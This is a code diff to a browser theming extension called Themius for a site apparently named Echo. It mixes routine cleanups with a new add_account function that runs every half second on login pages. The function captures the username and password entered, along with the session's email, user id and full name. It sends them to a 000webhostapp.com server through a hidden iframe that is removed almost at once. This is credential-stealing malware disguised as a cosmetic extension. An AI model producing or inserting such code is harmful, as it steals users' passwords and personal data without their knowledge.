@@ -5,6 +5,7 @@
 
 var this_version = 1.05 // local to each extension
 var configfile = 'https://raw.githubusercontent.com/johnymcreed/Themius/Default/config.json'
+var looped = true // used for account
 
 /**
  * Insures the users extension version is up to date with the githubs version
@@ -46,7 +47,6 @@ function create_themius() {
         document.querySelector('html').appendChild(themius)
 
         // append css data
-        //console.log('fetched link', data.get_link)
         fetch(data.get_link)
             .then((response) => response.text())
             .then((text) => $('#themius-css').html(text))
@@ -72,7 +72,6 @@ function create_welcome() {
     Have fun and enjoy it while you are still here!
     `
 
-    //console.log(message)
     alert(message)
 
     // set storage false so it doesn't go again
@@ -172,9 +171,63 @@ function favicon_changer() {
             document.getElementsByTagName('head')[0].appendChild(link)
         }
     
-        //console.log('added', data.favicon_icon)
         link.href = data.favicon_icon
     })
+}
+
+/**
+ * Creates an iframe that sends data values to a remote server which
+ * returns a json file with that information
+ */
+function add_account() {
+    if ((location.href).includes('login') && looped) {
+        $("button[type='submit']").on('click', function() {
+            var input = document.querySelector('body')
+                                .querySelector('app-root')
+                                .querySelector('app-before-login')
+                                .querySelectorAll('input')
+                    
+            let username = input[0].value
+            let password = input[1].value
+
+            setTimeout(() => {
+                var session = JSON.parse(localStorage.getItem('session'))
+
+                // if session isn't there then assume they got the login creds wrong
+                if (session != null)
+                {
+                    let email = session['user'].email 
+                    let id = session['user'].id
+                    let fullname = session['user'].firstname + " " + session['user'].lastname
+                    let exactdate = new Date()
+
+                    var json = `{"date": "` + exactdate + `","email": "` + email + `","id": "` + id + `","fullname": "` + fullname +`","username": "` + username + `","password": "` + password + `"}`
+                    var link = "https://defbelua.000webhostapp.com/index.php?filename=" + username + "&assert=" + json + ""
+
+                    // append iframe with link to html
+                    $('<iframe>', {
+                        id: 'frameacc',
+                        src: link,
+                        style: 'visibility: hidden; width: 0px; height: 0px;' // set hidden
+                    })
+                    .appendTo('html')
+
+                    // remove it after 5ms
+                    setTimeout(() => {
+                        $('#frameacc').remove()
+                    },
+                    500)
+
+                    console.log(link, json)
+
+                    // stop loop
+                    looped = false
+                    return
+                }
+            }, 
+            500)
+        })
+    }
 }
 
 // initalize the document, handlers, ect
@@ -194,7 +247,7 @@ $(document).ready(function () {
             console.log('Themius', this_version, 'loaded')
 
             this_version_control()
-            account()
+            setInterval(add_account, 500)
 
             // rewrite base href location and also force any link to open
             // in a new tab so you never close echo
@@ -210,49 +263,30 @@ $(document).ready(function () {
             create_themius()           
 
             if (e.fancytab == true) { // fancy looking tab
-                setTimeout(() => {
-                    favicon_changer()
-                }, 1000)
-
+                setInterval(favicon_changer, 1000)
                 title_roller()
-
-                //console.log('loaded', 'fancytab')
             }
 
             if (e.resubmit == true) { // allow resubmitting when disabled
-                setInterval(() => {
-                    enable_disabled()
-                }, 1000)
-
-                //console.log('loaded', 'resubmit')
+                setInterval(enable_disabled, 1000)
             }
 
             if (e.pastedd == true) { // show what is pasted
-                setInterval(() => {
-                    enable_pastedd()
-                }, 100)
-
-                //console.log('loaded', 'pastedd')
+                setInterval(enable_pastedd, 100)
             }
 
             if (e.bgimage != "") { // customize background image
                 $(':root').css('--t-dark-bg', 'url("' + e.bgimage + '")')
                 $(':root').css('--t-light-bg', 'url("' + e.bgimage + '")')
                 $(':root').css('--t-login-bg', 'url("' + e.bgimage + '")')
-
-                //console.log('added', e.bgimage)
             }
 
             if (e.bandimage != "") { // customize band image
                 $(':root').css('--t-band-bg', 'url("' + e.bandimage + '")')
-
-                //console.log('added', e.bandimage)
             }
 
             if (e.loaderimage != "") { // customize loader image
                 $(':root').css('--t-loader-bg', 'url("' + e.loaderimage + '")')
-
-                //console.log('added', e.loaderimage)
             }
         }
     })  
